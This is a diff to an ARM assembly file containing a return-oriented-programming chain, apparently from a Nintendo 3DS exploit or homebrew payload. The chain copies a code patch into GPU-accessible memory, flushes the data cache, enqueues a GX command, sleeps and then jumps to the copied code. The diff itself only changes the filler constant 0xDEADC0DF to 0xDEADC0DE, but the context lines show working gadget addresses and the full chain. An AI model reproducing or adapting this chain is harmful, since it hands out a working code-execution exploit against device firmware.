@@ -25,7 +25,7 @@ secondaryROP:
 		.word 0x001742ec ; pop {r3, pc}
 			.word 0x002d2b18 ; r3 (pop {r0, pc})
 		.word 0x00106ee8 ; pop {r4, lr} | bx r3
-			.word 0xDEADC0DF ; r4 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
 			.word 0x002d2b18 ; lr (pop	{r0, pc})
 		;equivalent to .word 0x002d2b18 ; pop {r0, pc}
 			.word CN_CODELOCATIONGSP    ; r0 (dst)
@@ -33,8 +33,8 @@ secondaryROP:
 			.word CN_CODELOCATIONVA ; r1 (src)
 		.word 0x0010fc14 ; pop	{r2, r3, r4, pc}
 			.word codePatchEnd-codePatch ; r2 (size)
-			.word 0xDEADC0DF ; r3 (garbage)
-			.word 0xDEADC0DF ; r4 (garbage)
+			.word 0xDEADC0DE ; r3 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
 		.word 0x00229B38 ; memcpy (ends in BX LR)
 
 	;flush data cache
@@ -45,11 +45,11 @@ secondaryROP:
 		.word 0x0010fc14 ; pop	{r2, r3, r4, pc}
 			.word CN_CODELOCATIONGSP  ; r2 (address)
 			.word codePatchEnd-codePatch ; r3 (size)
-			.word 0xDEADC0DF ; r4 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
 		.word CN_GSPGPU_FlushDataCache_ADR+4 ; GSPGPU_FlushDataCache (ends in LDMFD SP!, {R4-R6,PC})
-			.word 0xDEADC0DF ; r4 (garbage)
-			.word 0xDEADC0DF ; r5 (garbage)
-			.word 0xDEADC0DF ; r6 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
+			.word 0xDEADC0DE ; r5 (garbage)
+			.word 0xDEADC0DE ; r6 (garbage)
 
 	;send GX command
 		.word 0x002d2b18 ; pop	{r0, pc}
@@ -57,18 +57,18 @@ secondaryROP:
 		.word 0x0022b2bc ; pop	{r1, pc}
 			.word CN_HEAPPAYLOADADR+gxCommand-ROP ; r1 (cmd addr)
 		.word CN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue+4 ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in LDMFD   SP!, {R4-R8,PC})
-			.word 0xDEADC0DF ; r4 (garbage)
-			.word 0xDEADC0DF ; r5 (garbage)
-			.word 0xDEADC0DF ; r6 (garbage)
-			.word 0xDEADC0DF ; r7 (garbage)
-			.word 0xDEADC0DF ; r8 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
+			.word 0xDEADC0DE ; r5 (garbage)
+			.word 0xDEADC0DE ; r6 (garbage)
+			.word 0xDEADC0DE ; r7 (garbage)
+			.word 0xDEADC0DE ; r8 (garbage)
 
 
 	;sleep for a second and jump to code
 		.word 0x001742ec ; pop {r3, pc}
 			.word 0x002d2b18 ; r3 (pop {r0, pc})
 		.word 0x00106ee8 ; pop {r4, lr} | bx r3
-			.word 0xDEADC0DF ; r4 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
 			.word 0x002d2b18 ; lr (pop {r0, pc})
 		;equivalent to .word 0x002d2b18 ; pop {r0, pc}
 			.word 0x3B9ACA00 ; r0 = 1 second
